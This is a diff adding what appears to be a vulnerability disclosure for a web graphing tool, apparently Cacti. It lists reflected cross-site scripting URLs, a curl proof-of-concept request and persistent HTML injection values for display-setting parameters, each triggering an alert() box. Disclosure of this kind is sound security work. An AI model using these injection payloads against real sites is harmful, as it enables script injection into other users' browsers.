@@ -1,0 +1,22 @@
+Cross-site scripting:
+
+http://www.example.com/graph.php?action=zoom&amp;local_graph_id=1&amp;graph_end=1%27%20style=visibility:hidden%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cx%20y=%27
+http://www.example.com/graph.php?action=properties&amp;local_graph_id=201&amp;rra_id=0&amp;view_type=tree&amp;graph_start=%3C/pre%3E%3Cscript%3Ealert(4)%3C/script%3E%3Cpre%3E
+http://www.example.com/graph.php?action=properties&amp;local_graph_id=201&amp;rra_id=0&amp;view_type=tree&amp;graph_start=%3C/pre%3E%3Cscript%3Ealert(4)%3C/script%3E%3Cpre%3E
+
+
+&gt; curl -d &#039;date1=%27%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E%3Cx+y%3D%27&#039; &#039;http://CACTIHOST/graph_view.php?action=tree&amp;tree_id=1&amp;leaf_id=7&amp;select_first=true&#039; &gt; poc.html
+
+HTML injection:
+
+Setting &#039;page_refresh&#039; to the following value will, on any consecutive visitors&#039; web browser with Javascript support, cause a dialog box saying &#039;3&#039; to be displayed:
+  300&#039;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&lt;x y=&#039;
+
+Setting &#039;default_dual_pane_width&#039; to the following value will, on any consecutive visitors&#039; web browser with Javascript support, cause a dialog box saying &#039;3&#039; to be displayed:
+  200&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&lt;x y=&quot;
+
+Alternatively, a similar injection can be achieved, if an attacker or his victim has permission to modify the graph display settings via graph_settings.php. If so, the attacker is able to persistently inject javascript code via the &#039;title_size&#039;, &#039;legend_size&#039;, &#039;axis_size&#039; and
+&#039;unit_size&#039; parameters.
+
+Setting any of these parameters to the following value will, on any consecutive visitors&#039; web browser with Javascript support, cause a dialog box saying &#039;4&#039; to be displayed:
+  8&lt;/pre&gt;&lt;script&gt;alert(4)&lt;/script&gt;&lt;pre&gt;
